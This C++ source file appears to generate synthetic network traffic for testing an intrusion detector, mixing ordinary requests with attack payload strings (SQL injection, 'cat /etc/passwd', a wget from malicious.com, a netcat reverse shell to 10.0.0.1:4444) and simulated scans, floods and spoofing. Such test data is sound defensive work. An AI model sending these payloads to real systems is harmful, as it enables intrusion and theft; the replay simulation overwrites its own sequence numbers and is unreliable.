#include "traffic_simulator.h"
#include <random>
#include <ctime>
#include <iostream>

std::vector<Packet> TrafficSimulator::generateTraffic(int count) {
    std::vector<Packet> packets;
    std::vector<std::string> ip_pool = {
        "192.168.1.10", "192.168.1.15", "10.0.0.2", "10.0.0.5", "172.16.0.3"
    };
    std::vector<std::string> payloads = {
        // Normal traffic
        "GET /index.html HTTP/1.1", "POST /login HTTP/1.1", "normal data transfer",
        
        // SQL Injection attempts
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "UNION SELECT username, password FROM users",
        "'; DROP TABLE users; --",
        
        // Command injection
        "eval(base64_decode('ZWNobyAiaGFja2VkIg=='))",
        "system('cat /etc/passwd')",
        "exec('net user admin password123')",
        
        // Script injection
        "<script>document.cookie</script>",
        "<script>alert(document.cookie)</script>",
        
        // Shell commands
        "wget http://malicious.com/malware.exe",
        "nc -e /bin/bash 10.0.0.1 4444",
        "chmod +x /tmp/backdoor",
        
        // Credential exposure
        "password=admin123",
        "admin_pass=root123",
        
        // Malware signatures
        "MZ\x90\x00\x03\x00\x00\x00", // PE file header
        "\\x90\\x90\\x90\\x90\\x90",   // NOP sled
        
        // Normal traffic (to mix in)
        "Hello World!", "GET /style.css", "POST /api/data"
    };
    
    // Add more ports including suspicious ones
    std::vector<int> ports = { 
        80, 443,           // HTTP/HTTPS
        22, 23,           // SSH/Telnet
        445, 139,         // SMB/NetBIOS
        3389,             // RDP
        4444, 31337,      // Common backdoor ports
        1433, 3306,       // SQL Server/MySQL
        21, 25            // FTP/SMTP
    };

    std::mt19937 rng(static_cast<unsigned>(time(nullptr)));
    std::uniform_int_distribution<> ip_dist(0, ip_pool.size() - 1);
    std::uniform_int_distribution<> port_dist(0, ports.size() - 1);
    std::uniform_int_distribution<> payload_dist(0, payloads.size() - 1);
    
    // Generate some sequential port scans
    if (count > 10) {
        std::string scanner_ip = ip_pool[ip_dist(rng)];
        for (int port = 1; port <= 100; port++) {
            Packet scan_pkt;
            scan_pkt.src_ip = scanner_ip;
            scan_pkt.dst_ip = "192.168.0.1";
            scan_pkt.port = port;
            scan_pkt.payload = "Port scan probe";
            scan_pkt.src_port = 40000 + port;
            scan_pkt.tcp_seq = 123456 + port;
            scan_pkt.tcp_flags = 0x02;  // SYN flag for port scans
            packets.push_back(scan_pkt);
        }
    }

    // Generate regular traffic mixed with malicious packets
    for (int i = 0; i < count; ++i) {
        Packet pkt;
        pkt.src_ip = ip_pool[ip_dist(rng)];
        pkt.dst_ip = "192.168.0.1";
        pkt.port = ports[port_dist(rng)];
        pkt.payload = payloads[payload_dist(rng)];
        pkt.src_port = 30000 + i;
        pkt.tcp_seq = 100000 + i;
        pkt.tcp_flags = 0x18;  // PSH+ACK for regular traffic
        packets.push_back(pkt);
        
        // Occasionally generate a burst of packets (DoS simulation)
        if (i % 50 == 0) {
            std::string dos_ip = ip_pool[ip_dist(rng)];
            for (int j = 0; j < 20; j++) {
                Packet dos_pkt;
                dos_pkt.src_ip = dos_ip;
                dos_pkt.dst_ip = "192.168.0.1";
                dos_pkt.port = 80;
                dos_pkt.payload = "DoS packet";
                dos_pkt.src_port = 30000 + i;
                dos_pkt.tcp_seq = 100000 + i;
                dos_pkt.tcp_flags = 0x18;  // PSH+ACK for regular traffic
                packets.push_back(dos_pkt);
            }
        }
    }

    // SYN flood simulation
    if (count > 20) {
        std::string target_ip = "192.168.0.1";
        int target_port = 80;
        
        // Generate 100 SYN packets from 20 different IPs
        for (int i = 0; i < 100; i++) {
            Packet syn_pkt;
            // Generate spoofed source IPs
            syn_pkt.src_ip = "10.0." + std::to_string(i % 20) + "." + std::to_string(i % 256);
            syn_pkt.dst_ip = target_ip;
            syn_pkt.port = target_port;
            syn_pkt.tcp_flags = 0x02;  // SYN flag only
            syn_pkt.payload = "SYN packet";
            syn_pkt.src_port = 30000 + i;
            syn_pkt.tcp_seq = 100000 + i;
            packets.push_back(syn_pkt);
        }
        std::cout << "Generated " << packets.size() << " total packets including:"
                  << "\n  - SYN flood packets: 100"
                  << "\n  - ACK flood packets: 150" 
                  << "\n  - TCP replay packets: 4"
                  << "\n  - IP spoofing packets: 35" << std::endl;
    }

    // ACK flood simulation
    if (count > 20) {
        std::string target_ip = "192.168.0.1";
        int target_port = 80;
        
        // Generate 150 ACK packets from 10 different IPs
        for (int i = 0; i < 150; i++) {
            Packet ack_pkt;
            // Generate spoofed source IPs
            ack_pkt.src_ip = "172.16." + std::to_string(i % 10) + "." + std::to_string(1 + (i % 254));
            ack_pkt.dst_ip = target_ip;
            ack_pkt.port = target_port;
            ack_pkt.src_port = 30000 + (i % 10000);
            ack_pkt.tcp_flags = 0x10;  // ACK flag only
            ack_pkt.tcp_seq = 1000000 + i;
            ack_pkt.payload = "ACK packet";
            ack_pkt.src_port = 30000 + i;
            ack_pkt.tcp_seq = 100000 + i;
            packets.push_back(ack_pkt);
        }
        std::cout << "Generated " << packets.size() << " total packets including:"
                  << "\n  - SYN flood packets: 100"
                  << "\n  - ACK flood packets: 150" 
                  << "\n  - TCP replay packets: 4"
                  << "\n  - IP spoofing packets: 35" << std::endl;
    }

    // TCP replay attack simulation
    if (count > 30) {
        std::string src_ip = "192.168.1.100";
        std::string dst_ip = "192.168.0.1";
        int src_port = 45678;
        int dst_port = 80;
        
        // Generate same packet with same sequence number 4 times
        for (int i = 0; i < 4; i++) {
            Packet replay_pkt;
            replay_pkt.src_ip = src_ip;
            replay_pkt.dst_ip = dst_ip;
            replay_pkt.src_port = src_port;
            replay_pkt.port = dst_port;
            replay_pkt.tcp_flags = 0x18;  // PSH+ACK
            replay_pkt.tcp_seq = 12345;   // Same sequence number
            replay_pkt.payload = "This is a replayed packet";  // Same payload
            replay_pkt.src_port = 30000 + i;
            replay_pkt.tcp_seq = 100000 + i;
            packets.push_back(replay_pkt);
        }
        std::cout << "Generated " << packets.size() << " total packets including:"
                  << "\n  - SYN flood packets: 100"
                  << "\n  - ACK flood packets: 150" 
                  << "\n  - TCP replay packets: 4"
                  << "\n  - IP spoofing packets: 35" << std::endl;
    }

    // IP spoofing simulation
    if (count > 15) {
        // First establish normal behavior for an IP
        std::string established_ip = "10.1.1.1";
        
        // Normal behavior phase - just a few ports, similar payloads
        for (int i = 0; i < 10; i++) {
            Packet normal_pkt;
            normal_pkt.src_ip = established_ip;
            normal_pkt.dst_ip = "192.168.0.1";
            normal_pkt.src_port = 50000 + (i % 3);  // Use only 3 source ports
            normal_pkt.port = 80;  // Always connect to port 80
            normal_pkt.tcp_flags = 0x18;  // PSH+ACK
            normal_pkt.tcp_seq = 100000 + i;
            normal_pkt.payload = "Normal web traffic data";  // Consistent payload
            normal_pkt.src_port = 30000 + i;
            normal_pkt.tcp_seq = 100000 + i;
            packets.push_back(normal_pkt);
        }
        
        // Then sudden change suggesting spoofed IP
        for (int i = 0; i < 25; i++) {
            Packet spoofed_pkt;
            spoofed_pkt.src_ip = established_ip;  // Same source IP
            spoofed_pkt.dst_ip = "192.168.0.1";
            spoofed_pkt.src_port = 60000 + i;  // Many different source ports
            spoofed_pkt.port = 1000 + i;      // Scanning many destination ports
            spoofed_pkt.tcp_flags = 0x02;     // SYN
            spoofed_pkt.tcp_seq = 500000 + i;
            spoofed_pkt.payload = "Completely different payload pattern: " + std::to_string(i);
            spoofed_pkt.src_port = 30000 + i;
            spoofed_pkt.tcp_seq = 100000 + i;
            packets.push_back(spoofed_pkt);
        }
        std::cout << "Generated " << packets.size() << " total packets including:"
                  << "\n  - SYN flood packets: 100"
                  << "\n  - ACK flood packets: 150" 
                  << "\n  - TCP replay packets: 4"
                  << "\n  - IP spoofing packets: 35" << std::endl;
    }

    return packets;
}